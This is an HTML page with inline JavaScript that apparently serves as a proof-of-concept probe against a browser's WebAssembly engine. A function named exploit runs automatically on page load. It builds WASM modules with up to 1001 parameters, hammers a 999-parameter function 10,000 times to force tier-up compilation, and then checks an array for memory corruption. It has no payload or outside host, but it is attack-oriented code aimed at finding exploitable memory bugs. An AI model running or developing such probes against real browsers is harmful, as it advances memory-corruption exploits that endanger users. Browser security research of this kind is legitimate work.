<!DOCTYPE html><html><head><meta charset="utf-8"><title>LOADING</title></head>
<body><h3>WASM v6 inline</h3>
<pre id="log" style="font-size:11px;background:#111;color:#0f0;padding:8px;max-height:600px;overflow:auto;white-space:pre-wrap;"></pre>
<script>
function log(m){let e=document.getElementById('log');if(e)e.innerHTML+=m+'\n';document.title='['+m.substring(0,50)+']';}
function encodeLEB128(v){let r=[];do{let b=v&0x7f;v>>=7;if(v)b|=0x80;r.push(b)}while(v);return r}
function buildWasm(pc){
  let b=[0,0x61,0x73,0x6d,1,0,0,0];
  let ts=[...encodeLEB128(1),0x60,...encodeLEB128(pc)];
  for(let i=0;i<pc;i++)ts.push(0x7f);
  ts.push(...encodeLEB128(1),0x7f);
  b.push(1,...encodeLEB128(ts.length),...ts);
  b.push(3,...encodeLEB128(2),1,0);
  b.push(7,...encodeLEB128(4),1,1,0x66,0,0);
  let body=[0,0x41,0x2a,0x0b];
  let ce=[...encodeLEB128(body.length),...body];
  let cs=[1,...encodeLEB128(ce.length),...ce];
  b.push(0x0a,...encodeLEB128(cs.length),...cs);
  return new Uint8Array(b);
}
function exploit(){
  log('[*] WASM Boundary Test v6 (inline JS)');
  for(let pc of [10,100,500,900,999,1000,1001]){
    try{
      let m=new WebAssembly.Module(buildWasm(pc));
      let i=new WebAssembly.Instance(m);
      let a=new Array(pc).fill(42);
      let r=i.exports.f.apply(null,a);
      log('[+] '+pc+' params: OK r='+r);
    }catch(e){
      log('[!] '+pc+': '+e.message.substring(0,120));
    }
  }
  log('[*] Tier-up test: 999 params x 10000 calls...');
  try{
    let m=new WebAssembly.Module(buildWasm(999));
    let i=new WebAssembly.Instance(m);
    let a=new Array(999).fill(0);
    let t0=Date.now();
    for(let j=0;j<10000;j++) i.exports.f.apply(null,a);
    log('[+] Done in '+(Date.now()-t0)+'ms');
    let s=new Float64Array(64);s.fill(1.1);
    for(let j=0;j<64;j++)if(s[j]!==1.1){log('[+] CORRUPTION s['+j+']='+s[j]);return;}
    log('[*] No corruption');
  }catch(e){
    log('[!] Tier-up: '+e.message.substring(0,120));
  }
  log('[*] Spread test...');
  try{
    let m=new WebAssembly.Module(buildWasm(999));
    let i=new WebAssembly.Instance(m);
    let a=new Array(999).fill(1);
    let r=i.exports.f(...a);
    log('[+] Spread 999: r='+r);
  }catch(e){log('[!] Spread: '+e.message.substring(0,120));}
  log('[*] Done.');
}
setTimeout(exploit,500);
</script></body></html>
